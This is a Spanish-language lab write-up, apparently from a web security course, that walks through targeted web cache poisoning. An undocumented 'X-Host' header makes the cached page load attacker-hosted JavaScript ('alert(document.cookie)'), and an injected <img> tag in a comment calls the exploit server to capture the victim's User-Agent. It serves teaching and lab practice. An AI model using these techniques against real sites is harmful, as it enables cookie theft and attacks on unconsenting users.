En esta clase profundizamos en un ataque avanzado de Web Cache Poisoning en el que es necesario descubrir una cabecera no documentada —en este caso ‘**X-Host**‘— para manipular cómo el servidor genera contenido que posteriormente se almacena en caché.

Tras identificar el punto vulnerable y confirmar que la cabecera ‘**X-Host**‘ afecta a la generación de URLs para recursos estáticos, utilizamos dicha cabecera para referenciar un archivo JavaScript alojado en un servidor controlado por el atacante, el cual contiene un payload como ‘**alert(document.cookie)**‘.

Sin embargo, el laboratorio añade una capa adicional de complejidad: el uso de la cabecera ‘**Vary: User-Agent**‘ implica que la caché discrimina las respuestas en función del navegador. Para asegurar que el contenido envenenado impacta a la víctima, es necesario identificar su User-Agent, lo cual conseguimos mediante una petición enviada desde un comentario malicioso publicado en la web.

Una vez determinado el User-Agent de la víctima, se ajusta la petición para que coincida con dicho valor, permitiendo que el servidor entregue la versión cacheada del recurso malicioso únicamente a esa víctima.

Esta clase demuestra cómo el envenenamiento de caché puede ser altamente dirigido y silencioso, explotando cabeceras olvidadas y manipulaciones de cliente que normalmente pasarían desapercibidas.

Solucion
Repetimos los pasos y aqui vamos a utilizar la cabecera (X-Host:)
![Pasted image 20250821211041.png](imagenes/Pasted image 20250821211041.png)
el cual me permite controlar el dominio donde se redirige para cargar el recurso resource/js/tracking.js
asi que configuramos el exploit
![Pasted image 20250821212043.png](imagenes/Pasted image 20250821212043.png)
luego tenemos que redirigirlo a un user-Agent asi que podemos utilizar un truco en algun post poniendo lo siguiente (<img src="https://exploit-0a930053038b901f80741be201a40053.exploit-server.net" />)
![Pasted image 20250821212203.png](imagenes/Pasted image 20250821212203.png)
nos fijamos en los logs
![Pasted image 20250821212431.png](imagenes/Pasted image 20250821212431.png)
copiamos y pegamos en la BS y recargamos la pagina
![Pasted image 20250821233755.png](imagenes/Pasted image 20250821233755.png)




